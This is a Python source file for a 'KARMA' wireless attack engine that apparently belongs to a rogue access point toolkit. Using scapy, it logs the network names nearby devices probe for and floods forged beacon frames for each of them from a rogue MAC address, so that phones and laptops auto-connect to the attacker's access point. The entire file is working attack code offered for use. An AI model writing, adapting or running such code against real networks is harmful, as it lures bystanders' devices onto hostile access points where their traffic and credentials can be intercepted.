"""
KARMA Attack Module
───────────────────
Respond to ALL probe requests with beacon frames, regardless of the SSID
being probed. Triggers auto-connect on devices that remember networks.

Based on wifiphisher's knownbeacons.py concept but expanded to cover
any SSID a client has ever probed for.
"""

import time
import threading
from collections import defaultdict

from scapy.all import sendp
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap

from .config import BEACON_INTERVAL, WIFI_BROADCAST, log


class KARMAEngine:
    """
    KARMA attack engine.
    - Responds to probe requests with beacons for ANY SSID
    - Records all probed SSIDs for targeted beacon floods
    - Maintains a database of "remembered" networks per client
    """

    def __init__(self, interface, rogue_mac):
        self.interface = interface
        self.rogue_mac = rogue_mac
        self.running = False
        self._thread = None
        self._probed_ssids = defaultdict(set)  # client_mac -> set of probed SSIDs
        self._beacon_count = 0
        self._start_time = time.time()

    def on_probe_request(self, client_mac, ssid):
        """
        Record that a client probed for an SSID.
        Returns True if we should send a beacon response.
        """
        if ssid:
            self._probed_ssids[client_mac].add(ssid)
            log.debug(f"Client {client_mac} probed for '{ssid}'")
        return True  # Always respond with beacon

    def _build_beacon(self, ssid):
        """Build a beacon frame for the given SSID."""
        return (
            RadioTap() /
            Dot11(type=0, subtype=8, addr1=WIFI_BROADCAST,
                  addr2=self.rogue_mac, addr3=self.rogue_mac) /
            Dot11Beacon(cap=0x2105) /
            Dot11Elt(ID="SSID", info=ssid.encode() if isinstance(ssid, str) else ssid) /
            Dot11Elt(ID="Rates", info=b"\x0c\x12\x18\x24\x30\x48\x60\x6c") /
            Dot11Elt(ID="DSset", info=b"\x06")
        )

    def _beacon_loop(self):
        """Broadcast beacons for all probed SSIDs."""
        while self.running:
            now = time.time()
            if now - self._start_time > 60:  # Rotate every 60s
                self._start_time = now
                self._beacon_count += 1

            for ssid_set in self._probed_ssids.values():
                for ssid in ssid_set:
                    if not self.running:
                        break
                    frame = self._build_beacon(ssid)
                    sendp(frame, iface=self.interface, verbose=False)
                    time.sleep(BEACON_INTERVAL)

    def start(self):
        if self.running:
            return
        self.running = True
        self._thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._thread.start()
        log.info(f"KARMA engine started ({len(self._probed_ssids)} clients tracking)")

    def stop(self):
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info(f"KARMA stopped. Total beacons sent: {self._beacon_count}")

    def get_stats(self):
        """Return KARMA statistics."""
        total_ssids = sum(len(ssids) for ssids in self._probed_ssids.values())
        return {
            "clients": len(self._probed_ssids),
            "total_ssids": total_ssids,
            "beacons_sent": self._beacon_count,
        }
